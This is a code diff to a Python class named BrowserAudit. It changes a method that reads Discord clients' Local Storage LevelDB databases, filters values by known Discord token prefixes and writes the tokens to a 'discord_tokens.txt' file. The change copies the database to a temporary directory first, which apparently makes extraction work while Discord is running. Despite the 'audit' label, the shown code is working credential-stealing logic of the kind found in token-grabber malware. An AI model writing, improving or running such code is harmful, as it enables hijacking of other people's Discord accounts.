@@ -166,6 +166,8 @@ class BrowserAudit:
     def extract_discord_tokens(self):
         try:
             import plyvel
+            import shutil
+            import tempfile
         except ImportError:
             return
 
@@ -183,36 +185,40 @@ class BrowserAudit:
                 "Discord Canary": self.home / ".config/discordcanary",
                 "Equicord": self.home / ".config/Equicord"
             }
-        
+
         found_any = False
-        
+
         for app_name, discord_dir in discord_dirs.items():
             leveldb_path = discord_dir / "Local Storage/leveldb"
-            
+
             if not leveldb_path.exists():
                 continue
-            
+
             try:
-                db = plyvel.DB(str(leveldb_path), create_if_missing=False)
-                
-                for key, value in db.iterator():
-                    key_str = key.decode('utf-8', errors='ignore')
-                    
-                    if 'token' in key_str.lower() and 'discord' in key_str.lower():
-                        try:
-                            value_str = value.decode('utf-8', errors='ignore').strip('"')
-                            
-                            if len(value_str) > 50 and any(x in value_str for x in ['MjcyMjE', 'MzA', 'NzA', 'mfa.', 'dbl_']):
-                                with open(self.cookies_dir / "discord_tokens.txt", 'a') as f:
-                                    f.write(f"[{app_name}] {value_str}\n")
-                                found_any = True
-                        except:
-                            pass
-                
-                db.close()
+                with tempfile.TemporaryDirectory() as tmpdir:
+                    temp_db = Path(tmpdir) / "leveldb"
+                    shutil.copytree(leveldb_path, temp_db)
+
+                    db = plyvel.DB(str(temp_db), create_if_missing=False)
+
+                    for key, value in db.iterator():
+                        key_str = key.decode('utf-8', errors='ignore')
+
+                        if 'token' in key_str.lower() and 'discord' in key_str.lower():
+                            try:
+                                value_str = value.decode('utf-8', errors='ignore').strip('"')
+
+                                if len(value_str) > 50 and any(x in value_str for x in ['MjcyMjE', 'MzA', 'NzA', 'mfa.', 'dbl_']):
+                                    with open(self.cookies_dir / "discord_tokens.txt", 'a') as f:
+                                        f.write(f"[{app_name}] {value_str}\n")
+                                    found_any = True
+                            except:
+                                pass
+
+                    db.close()
             except Exception as e:
                 self.log("ERROR", f"Discord extraction failed: {e}")
-        
+
         if found_any:
             print("[OK] Discord tokens extracted\n")
 
